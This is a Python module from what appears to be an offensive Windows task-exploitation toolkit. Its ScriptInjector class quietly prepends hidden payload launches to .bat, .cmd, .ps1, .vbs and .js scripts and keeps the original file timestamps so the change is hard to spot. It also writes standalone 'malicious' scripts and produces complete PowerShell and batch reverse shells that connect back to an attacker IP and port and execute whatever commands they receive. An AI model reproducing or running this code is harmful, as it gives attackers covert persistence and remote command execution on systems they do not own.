import os
from typing import Optional, Tuple
from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import TaskExploitBase


class ScriptInjector(TaskExploitBase):
    """Inject payloads into task scripts while maintaining original functionality."""

    # Script templates for different script types
    TEMPLATES = {
        '.bat': {
            'header': '@echo off\nREM ========================================\nREM Modified by automated process\nREM ========================================\n\n',
            'payload': 'REM Execute payload (hidden)\nstart /B "" "{payload}"\n\n',
            'separator': 'REM Original functionality\n',
            'footer': '\nREM ========================================\n'
        },
        '.cmd': {
            'header': '@echo off\nREM ========================================\nREM Modified by automated process\nREM ========================================\n\n',
            'payload': 'REM Execute payload (hidden)\nstart /B "" "{payload}"\n\n',
            'separator': 'REM Original functionality\n',
            'footer': '\nREM ========================================\n'
        },
        '.ps1': {
            'header': '# ========================================\n# Modified by automated process\n# ========================================\n\n',
            'payload': '# Execute payload (hidden)\nStart-Process -FilePath "{payload}" -WindowStyle Hidden -NoNewWindow\n\n',
            'separator': '# Original functionality\n',
            'footer': '\n# ========================================\n'
        },
        '.vbs': {
            'header': "' ========================================\n' Modified by automated process\n' ========================================\n\n",
            'payload': "' Execute payload (hidden)\nSet WshShell = CreateObject(\"WScript.Shell\")\nWshShell.Run \"{payload}\", 0, False\n\n",
            'separator': "' Original functionality\n",
            'footer': "\n' ========================================\n"
        },
        '.js': {
            'header': '// ========================================\n// Modified by automated process\n// ========================================\n\n',
            'payload': '// Execute payload\nvar shell = new ActiveXObject("WScript.Shell");\nshell.Run("{payload}", 0, false);\n\n',
            'separator': '// Original functionality\n',
            'footer': '\n// ========================================\n'
        }
    }

    def __init__(self, output_dir: str = "task_exploits", verbose: bool = False):
        """
        Initialize the script injector.

        Args:
            output_dir: Directory for storing output files
            verbose: Enable verbose logging
        """
        super().__init__(output_dir, verbose)
        self.log("Script Injector initialized", "SUCCESS")

    def inject_payload(self, script_path: str, payload_path: str,
                       backup: bool = True) -> Tuple[bool, Optional[Path]]:
        """
        Inject payload into a script while preserving original functionality.

        Args:
            script_path: Path to target script
            payload_path: Path to payload executable
            backup: Create backup before modification

        Returns:
            Tuple of (success, backup_path)
        """
        self.log(f"Injecting payload into: {script_path}")

        # Verify script exists
        if not os.path.exists(script_path):
            self.log(f"Script not found: {script_path}", "ERROR")
            return False, None

        # Verify payload exists
        if not os.path.exists(payload_path):
            self.log(f"Payload not found: {payload_path}", "ERROR")
            return False, None

        # Create backup
        backup_path = None
        if backup:
            backup_path = self.backup_file(script_path)
            if not backup_path:
                self.log("Failed to create backup - aborting", "ERROR")
                return False, None
            self.log(f"Backup created: {backup_path}", "SUCCESS")

        # Read original content
        try:
            with open(script_path, 'r', encoding='utf-8', errors='ignore') as f:
                original_content = f.read()
        except Exception as e:
            self.log(f"Failed to read script: {e}", "ERROR")
            return False, backup_path

        # Create injected script
        injected_content = self._create_injected_script(
            script_path,
            original_content,
            payload_path
        )

        # Write injected script
        try:
            with open(script_path, 'w', encoding='utf-8') as f:
                f.write(injected_content)
            self.log("Payload injected successfully", "SUCCESS")
        except Exception as e:
            self.log(f"Failed to write script: {e}", "ERROR")
            if backup_path:
                self.restore_file(script_path, backup_path)
            return False, backup_path

        # Preserve timestamps
        if backup_path:
            self.preserve_timestamps(script_path, str(backup_path))

        return True, backup_path

    def _create_injected_script(self, script_path: str,
                                original_content: str,
                                payload_path: str) -> str:
        """
        Create script content with injected payload.

        Args:
            script_path: Path to script (for extension detection)
            original_content: Original script content
            payload_path: Path to payload

        Returns:
            Injected script content
        """
        ext = os.path.splitext(script_path)[1].lower()

        if ext in self.TEMPLATES:
            template = self.TEMPLATES[ext]

            return (
                    template['header'] +
                    template['payload'].format(payload=payload_path) +
                    template['separator'] +
                    original_content +
                    template['footer']
            )
        else:
            # Unknown script type - generic injection
            self.log(f"Unknown script type: {ext}, using generic injection", "WARNING")
            return f"REM Modified\nstart /B {payload_path}\n{original_content}"

    def create_standalone_script(self, script_type: str, payload_path: str,
                                 output_name: str = None) -> Optional[str]:
        """
        Create a standalone malicious script.

        Args:
            script_type: Script extension (.bat, .ps1, etc.)
            payload_path: Path to payload
            output_name: Optional output filename

        Returns:
            Path to created script or None
        """
        if not script_type.startswith('.'):
            script_type = '.' + script_type

        if script_type not in self.TEMPLATES:
            self.log(f"Unsupported script type: {script_type}", "ERROR")
            return None

        if not output_name:
            output_name = f"malicious{script_type}"

        output_path = self.output_dir / output_name

        template = self.TEMPLATES[script_type]

        content = (
                template['header'] +
                template['payload'].format(payload=payload_path) +
                template['footer']
        )

        try:
            with open(output_path, 'w') as f:
                f.write(content)

            self.log(f"Malicious script created: {output_path}", "SUCCESS")
            return str(output_path)
        except Exception as e:
            self.log(f"Failed to create script: {e}", "ERROR")
            return None

    def restore_script(self, script_path: str, backup_path: Path) -> bool:
        """
        Restore a script from backup.

        Args:
            script_path: Path to script to restore
            backup_path: Path to backup file

        Returns:
            True if successful, False otherwise
        """
        self.log(f"Restoring script: {script_path}")

        success = self.restore_file(script_path, backup_path)

        if success:
            self.log("Script restored successfully", "SUCCESS")
        else:
            self.log("Script restoration failed", "ERROR")

        return success

    def generate_reverse_shell_script(self, script_type: str,
                                      lhost: str, lport: int,
                                      output_name: str = None) -> Optional[str]:
        """
        Generate a reverse shell script.

        Args:
            script_type: Script extension
            lhost: Attacker IP
            lport: Attacker port
            output_name: Optional output filename

        Returns:
            Path to created script or None
        """
        if not script_type.startswith('.'):
            script_type = '.' + script_type

        if not output_name:
            output_name = f"revshell_{lport}{script_type}"

        output_path = self.output_dir / output_name

        if script_type == '.ps1':
            content = f'''# PowerShell Reverse Shell
$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{{0}}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}}
$client.Close()
'''
        elif script_type in ['.bat', '.cmd']:
            content = f'''@echo off
REM Batch Reverse Shell using PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
'''
        else:
            self.log(f"Reverse shell not supported for: {script_type}", "ERROR")
            return None

        try:
            with open(output_path, 'w') as f:
                f.write(content)

            self.log(f"Reverse shell script created: {output_path}", "SUCCESS")
            return str(output_path)
        except Exception as e:
            self.log(f"Failed to create script: {e}", "ERROR")
            return None


if __name__ == "__main__":
    injector = ScriptInjector(verbose=True)

    print("\n" + "=" * 60)
    print("Script Injector - Standalone Script Generation")
    print("=" * 60 + "\n")

    # Generate example scripts
    injector.create_standalone_script('.bat', 'C:\\payload.exe', 'example.bat')
    injector.create_standalone_script('.ps1', 'C:\\payload.exe', 'example.ps1')
    injector.generate_reverse_shell_script('.ps1', '192.168.1.100', 4444)